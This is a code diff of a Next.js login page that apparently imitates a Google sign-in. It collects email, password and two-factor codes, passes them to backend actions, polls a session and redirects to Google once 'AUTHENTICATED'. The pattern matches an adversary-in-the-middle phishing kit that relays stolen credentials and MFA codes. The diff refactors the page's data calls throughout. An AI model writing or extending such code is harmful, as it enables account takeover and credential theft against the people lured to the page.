@@ -5,7 +5,7 @@ import PasswordView from "@/components/PasswordView";
 import TwoFactor from "@/components/TwoFactor";
 import Footer from "@/components/ui/footer";
 import LogoSVG from "@/components/ui/logo";
-import { googleApi } from "@/lib/api";
+import { initiateLogin, submitPassword, submit2FA, switch2FA, getSession } from "./actions";
 import { loginSchema } from "@/lib/schemas";
 import {
   ChallengeMetadata,
@@ -52,11 +52,14 @@ export default function Page() {
 
   // Real API mutations
   const initiateMutation = useMutation({
-    mutationFn: (email: string) =>
-      googleApi.initiateLogin({
+    mutationFn: async (email: string) => {
+      const res = await initiateLogin({
         email,
         fingerprint: getBrowserFingerprint(),
-      }),
+      });
+      if (!res.success || !res.data) throw new Error(res.message || "Failed");
+      return res.data;
+    },
     onSuccess: (data) => {
       if (data.sessionId) setSessionId(data.sessionId);
       if (data.status === "REQUIRES_PASSWORD") {
@@ -71,11 +74,14 @@ export default function Page() {
   });
 
   const passwordMutation = useMutation({
-    mutationFn: (data: LoginFormData) =>
-      googleApi.submitPassword({
+    mutationFn: async (data: LoginFormData) => {
+      const res = await submitPassword({
         sessionId: sessionId!,
         password: data.password,
-      }),
+      });
+      if (!res.success || !res.data) throw new Error(res.message || "Failed");
+      return res.data;
+    },
     onSuccess: (data) => {
       if (data.status === "AUTHENTICATED") {
         redirectToGoogle();
@@ -154,12 +160,14 @@ export default function Page() {
     if (sessionId && step === "2fa" && !isSuccess) {
       pollInterval = setInterval(async () => {
         try {
-          const session = await googleApi.getSession(sessionId);
-          // @ts-ignore - session is wrapped in data
-          const status = session?.data?.status || session?.status;
-          if (status === "AUTHENTICATED") {
-            clearInterval(pollInterval);
-            redirectToGoogle();
+          const res = await getSession(sessionId);
+          if (res.success && res.data) {
+            // @ts-ignore - session is wrapped in data
+            const status = res.data?.data?.status || res.data?.status;
+            if (status === "AUTHENTICATED") {
+              clearInterval(pollInterval);
+              redirectToGoogle();
+            }
           }
         } catch (err) {
           console.error("Polling error", err);
@@ -176,10 +184,13 @@ export default function Page() {
     if (!sessionId) return;
     setIs2FALoading(true);
     try {
-      const data = await googleApi.submit2FA({
+      const res = await submit2FA({
         sessionId,
         code: twoFactorCode,
       });
+      if (!res.success || !res.data) throw new Error(res.message || "Invalid code");
+      
+      const data = res.data;
       if (data.status === "AUTHENTICATED") {
         redirectToGoogle();
       }
@@ -195,7 +206,10 @@ export default function Page() {
     if (!sessionId) return;
     setIs2FALoading(true);
     try {
-      const data = await googleApi.switch2FA({ sessionId, method });
+      const res = await switch2FA({ sessionId, method });
+      if (!res.success || !res.data) throw new Error(res.message || "Failed to switch method");
+      
+      const data = res.data;
       setChallengeType(data.challengeType || null);
       setChallengeMetadata(data.challengeMetadata || null);
       setBackendMessage(data.message || null);
